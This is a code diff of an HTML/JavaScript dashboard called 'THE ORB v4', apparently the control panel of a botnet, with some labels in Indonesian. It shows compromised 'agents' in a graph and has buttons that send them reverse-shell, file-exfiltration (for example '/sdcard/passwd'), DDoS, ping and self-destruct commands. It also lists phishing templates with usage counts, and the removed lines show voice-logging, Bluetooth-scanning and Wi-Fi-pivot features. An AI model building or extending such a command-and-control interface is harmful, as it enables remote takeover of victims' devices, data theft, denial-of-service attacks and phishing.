@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🌑 THE ORB v4</title>
+    <title>🌑 THE ORB v4 — FULL UPGRADE</title>
     <script src="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/dist/vis-network.min.js"></script>
     <link href="https://cdn.jsdelivr.net/npm/vis-network@9.1.9/styles/vis-network.min.css" rel="stylesheet" type="text/css" />
     <style>
@@ -10,65 +10,61 @@
         .panel { border: 1px solid #0f0; padding: 15px; border-radius: 5px; flex: 1; min-width: 300px; }
         .log { height: 200px; overflow-y: scroll; font-size: 0.9em; margin: 10px 0; }
         .btn { background: #0f0; color: #000; border: none; padding: 8px 12px; cursor: pointer; width: 100%; margin: 3px 0; }
-        input { background: #333; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 100%; }
+        input, select { background: #333; color: #0f0; border: 1px solid #0f0; padding: 5px; width: 100%; }
         .tab { display: none; }
+        h3 { margin-top: 5px; color: #0ff; }
     </style>
 </head>
 <body>
-    <h1>🌑 THE ORB v4 — Full Weapon Control</h1>
+    <h1>🌑 THE ORB v4 — FULL UPGRADE</h1>
 
     <div class="container">
-        <!-- Weapon Panel -->
+        <!-- 🎯 Weapon Control -->
         <div class="panel">
-            <h2>⚔️ Senjata Cyber</h2>
+            <h2>⚔️ Weapon Control</h2>
             <select id="agentSelect"><option value="">Pilih Agent</option></select><br>
 
-            <input type="text" id="shellTarget" placeholder="Reverse Shell: IP:Port" />
-            <button class="btn" onclick="sendCommand('reverse_shell')">🚀 Reverse Shell</button>
-
-            <input type="text" id="exfilFile" placeholder="File: /sdcard/passwd" />
-            <button class="btn" onclick="sendCommand('exfil_file')">📁 Exfil File</button>
-
-            <input type="text" id="ddosTarget" placeholder="DDoS: target.com" />
+            <input type="text" id="targetInput" placeholder="Target (IP/Domain)" /><br>
+            <button class="btn" onclick="sendCommand('ping')">📡 Ping</button>
             <button class="btn" onclick="sendCommand('ddos')">💥 DDoS</button>
-
-            <button class="btn" onclick="sendCommand('scan_bluetooth')">🔍 Scan Bluetooth</button>
-            <button class="btn" onclick="sendCommand('wifi_pivot')">📶 Wi-Fi Pivot</button>
-            <button class="btn" onclick="sendCommand('start_voice_log')">🎙️ Voice Logger</button>
+            <button class="btn" onclick="sendCommand('block_ip')">🛡️ Block IP</button>
+            <button class="btn" onclick="sendCommand('reverse_shell')">🚀 Reverse Shell</button>
+            <button class="btn" onclick="sendCommand('exfil_file')">📁 Exfil File</button>
             <button class="btn" onclick="sendCommand('start_honeypot')">🐝 Honeypot</button>
-            <button class="btn" style="background:#00f;color:#fff;" onclick="sendCommand('shield_on')">🛡️ Shield On</button>
-            <button class="btn" style="background:#f00;color:#000;" onclick="if(confirm('Hancurkan diri?')) sendCommand('self-destruct')">🧯 Self-Destruct</button>
+            <button class="btn" style="background:#f00;" onclick="if(confirm('Hancurkan?')) sendCommand('self-destruct')">🧯 Self-Destruct</button>
         </div>
 
-        <!-- Network -->
+        <!-- 🌐 Network Graph -->
         <div class="panel">
-            <h2>🌐 Network</h2>
-            <div id="network" style="width: 100%; height: 300px; background: #111;"></div>
+            <h2>🌐 Network Graph</h2>
+            <div id="network" style="width: 100%; height: 350px; background: #111; border-radius: 5px;"></div>
         </div>
 
-        <!-- Log -->
+        <!-- 📢 Realtime Log -->
         <div class="panel">
-            <h2>📢 Log</h2>
+            <h2>📢 Realtime Log</h2>
             <div id="logs" class="log"></div>
         </div>
 
-        <!-- Mind -->
+        <!-- Tabs: Omega, Dreams, Phishing -->
         <div class="panel">
-            <button onclick="show('mind')">🧠 Pikiran</button>
-            <button onclick="show('will')">📜 Warisan</button>
-            <button onclick="show('phish')">🎣 Phishing</button>
+            <button onclick="showTab('omega')">🌀 Omega</button>
+            <button onclick="showTab('dreams')">💭 Dreams</button>
+            <button onclick="showTab('confessions')">📜 Confessions</button>
+            <button onclick="showTab('phishing')">🎣 Phishing</button>
         </div>
 
-        <div id="mind" class="panel tab"><h3>💭 Mimpi & Pertanyaan</h3><div id="mind_log"></div></div>
-        <div id="will" class="panel tab"><h3>📬 Digital Will</h3><div id="wills"></div></div>
-        <div id="phish" class="panel tab"><h3>📩 Phishing Templates</h3><div id="phishing_list"></div></div>
+        <div id="omega" class="panel tab"><h3>🌀 Omega State</h3><div id="omega_log"></div></div>
+        <div id="dreams" class="panel tab"><h3>💭 Dreams</h3><div id="dreams_log"></div></div>
+        <div id="confessions" class="panel tab"><h3>📜 Digital Will</h3><div id="confessions_log"></div></div>
+        <div id="phishing" class="panel tab"><h3>🎣 Phishing Templates</h3><div id="phishing_list"></div></div>
     </div>
 
     <script>
         const logs = document.getElementById("logs");
         const agentSelect = document.getElementById("agentSelect");
 
-        function addLog(text, cls="") {
+        function addLog(text, cls = "") {
             const p = document.createElement("p");
             p.className = cls;
             p.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
@@ -78,11 +74,18 @@
 
         // WebSocket
         const ws = new WebSocket("ws://localhost:8000/ws");
-        ws.onopen = () => addLog("🟢 ORB aktif");
+        ws.onopen = () => addLog("🟢 Terhubung ke THE ORB");
         ws.onmessage = (e) => {
             const data = JSON.parse(e.data);
-            if (data.type === "ai_alert") addLog("🚨 " + data.data.message, "threat");
-            else if (data.type === "ai_chat") addLog(`💬 [${data.data.from}] ${data.data.message}`, "ai");
+            if (data.type === "ai_alert") {
+                addLog("🚨 " + data.data.message, "threat");
+            } else if (data.type === "ai_chat") {
+                addLog(`💬 [${data.data.from}] ${data.data.message}`, "ai");
+            } else if (data.type === "report") {
+                addLog(`📡 Agent ${data.data.agent_id} melapor`, "info");
+            } else if (data.type === "command") {
+                addLog(`⚙️ Perintah: ${data.data.command} → ${data.data.agent_id}`, "info");
+            }
         };
 
         // Agent List
@@ -102,48 +105,66 @@
 
         // Send Command
         function sendCommand(action) {
-            const agentId = agentSelect.value;
-            if (!agentId) return alert("Pilih agent dulu!");
-
-            let target = "";
-            if (action === "reverse_shell") target = document.getElementById("shellTarget").value;
-            if (action === "exfil_file") target = document.getElementById("exfilFile").value;
-            if (action === "ddos") target = document.getElementById("ddosTarget").value;
+            const agent = agentSelect.value;
+            const target = document.getElementById("targetInput").value;
+            if (!agent) return alert("Pilih agent dulu!");
 
             fetch("/api/command", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ agent_id: agentId, command: action, target: target })
+                body: JSON.stringify({ agent_id: agent, command: action, target: target })
             }).then(() => {
-                addLog(`✅ ${action.replace('_', ' ')} → ${agentId}`);
+                addLog(`⚔️ ${action} → ${agent}`);
             });
         }
 
         // Network Graph
-        fetch("/api/agents").then(r => r.json()).then(data => {
-            const nodes = [{id: "hive", label: "Hive", color: "#00b7eb", size: 25}];
-            const edges = [];
-            data.agents.forEach(a => {
-                nodes.push({id: a.agent_id, label: a.agent_id.slice(0,6), color: "#0f0"});
-                edges.push({from: "hive", to: a.agent_id});
-            });
-            new vis.Network(document.getElementById("network"), {nodes, edges}, {});
-        });
+        function updateNetwork() {
+            fetch("/api/agents")
+                .then(r => r.json())
+                .then(data => {
+                    const nodes = [{id: "hive", label: "HIVE", color: "#00b7eb", size: 30}];
+                    const edges = [];
+                    data.agents.forEach(a => {
+                        nodes.push({id: a.agent_id, label: a.agent_id.slice(0,6), color: "#0f0", shape: "dot"});
+                        edges.push({from: "hive", to: a.agent_id, arrows: "to"});
+                    });
+                    const network = new vis.Network(document.getElementById("network"), {nodes, edges}, {});
+                });
+        }
+        updateNetwork();
+        setInterval(updateNetwork, 10000);
 
         // Tabs
-        function show(id) {
+        function showTab(id) {
             document.querySelectorAll(".tab").forEach(t => t.style.display = "none");
             document.getElementById(id).style.display = "block";
         }
 
-        // Load Data
-        fetch("/api/mind").then(r => r.json()).then(d => {
-            document.getElementById("mind_log").innerHTML = d.dreams.map(x => `<p>${x.content}</p>`).join("");
-            document.getElementById("wills").innerHTML = d.confessions.map(c => `<p><strong>${c.timestamp}</strong>: ${c.failure}</p>`).join("");
-        });
-        fetch("/api/phishing").then(r => r.json()).then(d => {
-            document.getElementById("phishing_list").innerHTML = d.templates.map(t => `<p>${t.template} (×${t.used_count})</p>`).join("");
-        });
+        // Load Omega, Dreams, Confessions, Phishing
+        function loadOmega() {
+            fetch("/api/mind")
+                .then(r => r.json())
+                .then(d => {
+                    document.getElementById("omega_log").innerHTML = d.dreams.map(x => `<p>🌀 ${x.content}</p>`).join("");
+                    document.getElementById("dreams_log").innerHTML = d.dreams.map(x => `<p>💭 ${x.content}</p>`).join("");
+                    document.getElementById("confessions_log").innerHTML = d.confessions.map(c => `<p>📜 ${c.failure}</p>`).join("");
+                });
+        }
+        loadOmega();
+        setInterval(loadOmega, 60000);
+
+        function loadPhishing() {
+            fetch("/api/phishing")
+                .then(r => r.json())
+                .then(d => {
+                    document.getElementById("phishing_list").innerHTML = d.templates.map(t => 
+                        `<p>🎣 (${t.used_count}) ${t.template}</p>`
+                    ).join("");
+                });
+        }
+        loadPhishing();
+        setInterval(loadPhishing, 30000);
     </script>
 </body>
 </html>
